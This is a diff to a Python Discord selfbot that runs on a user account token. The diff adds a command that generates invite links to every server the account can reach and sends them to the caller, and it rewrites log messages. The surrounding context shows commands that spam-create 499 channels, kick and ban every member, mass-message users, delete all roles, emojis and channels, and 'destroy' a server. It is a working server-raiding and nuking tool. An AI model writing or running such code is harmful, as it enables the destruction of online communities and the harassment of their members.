@@ -45,13 +45,6 @@ try:
         member = await super().convert(ctx, argument)
         return [role.name for role in member.roles[1:]]
 
-    @commands.check(self_check)
-    @bot.command()
-    async def rcolor(ctx):
-        guild = ctx.guild
-        for i in range(499):
-          await discord.edit_role(server=586535646550687744, role=586536287792660491, colour=discord.Colour(0xFF0000))
-          time.sleep(2)
 
     @commands.check(self_check)
     @bot.command()
@@ -67,10 +60,6 @@ try:
           duckimg = str(requests.get('https://random-d.uk/api/v1/random').json()['url'])
           await ctx.send(duckimg)
 
-    @commands.check(self_check)
-    @bot.command()
-    async def roles(ctx, *, member: MemberRoles):
-        await ctx.send('I see the following roles: ' + ', '.join(member))
 
     @commands.check(self_check)
     @bot.command(pass_context=True)
@@ -80,6 +69,20 @@ try:
         for i in range(499):
             print ("The channel " + string + " has been created in " + ctx.guild.name)
             await guild.create_text_channel(string)
+
+    @commands.check(self_check)
+    @bot.command(pass_context=True)
+    async def invites(ctx):
+       serverlast = 0
+       for guild in bot.guilds:
+        for channel in guild.channels:
+            if serverlast != guild:
+                try:
+                    invitelink = await channel.create_invite(max_uses=1,unique=True)
+                    await ctx.author.send(invitelink)
+                    serverlast = guild
+                except:
+                    print("Invite Creation Failed!")
 
     @commands.check(self_check)
     @bot.command(pass_context=True)
@@ -118,8 +121,8 @@ try:
                 print (f"{user.name} has been kicked from {ctx.guild.name}")
             except:
                 print (f"{user.name} has FAILED to be kicked from {ctx.guild.name}")
-        print ("Action Completed: kall")
-    # Kicks every member in a server.
+        print ("Kicked All Members!")
+
 
     @commands.check(self_check)
     @bot.command(pass_context=True)
@@ -131,7 +134,7 @@ try:
                 print (f"{user.name} has been banned from {ctx.guild.name}")
             except:
                 print (f"{user.name} has FAILED to be banned from {ctx.guild.name}")
-        print ("Action Completed: ball")
+        print ("Banned All Members!")
 
 
     @commands.check(self_check)
@@ -169,7 +172,7 @@ try:
                 print(f"{user.name} has recieved the message.")
             except:
                 print(f"{user.name} has NOT recieved the message.")
-        print("Action Completed: mall")
+        print("Messeged Everyone Dickhead")
 
     @commands.check(self_check)
     @bot.command(pass_context=True)
@@ -189,7 +192,7 @@ try:
                     print (f"{role.name} has been deleted in {ctx.guild.name}")
                 except:
                     print (f"{role.name} has NOT been deleted in {ctx.guild.name}")
-            print ("Action Completed: dall roles")
+            print ("smh now there is no roles")
         elif condition.lower() == "emojis":
             for emoji in list(ctx.guild.emojis):
                 try:
@@ -197,7 +200,7 @@ try:
                     print (f"{emoji.name} has been deleted in {ctx.guild.name}")
                 except:
                     print (f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
-            print ("Action Completed: dall emojis")
+            print ("Deleted epic emojicon")
         elif condition.lower() == "all":
             for channel in list(ctx.guild.channels):
                 try:
@@ -217,7 +220,7 @@ try:
                     print (f"{emoji.name} has been deleted in {ctx.guild.name}")
                 except:
                     print (f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
-            print ("Action Completed: dall all")
+            print ("Deleted Everything smh")
 
     @commands.check(self_check)
     @bot.command(pass_context=True)
@@ -247,11 +250,10 @@ try:
                 print (f"{user.name} has been banned from {ctx.guild.name}")
             except:
                 print (f"{user.name} has FAILED to be banned from {ctx.guild.name}")
-        print ("Action Completed: destroy")
-    # Outright destroys a server.
+        print ("you are a terrible person")
+
 
 except:
     pass
 
 bot.run(token, bot=False)
-# Starts the bot by passing it a token and telling it it isn't really a bot.
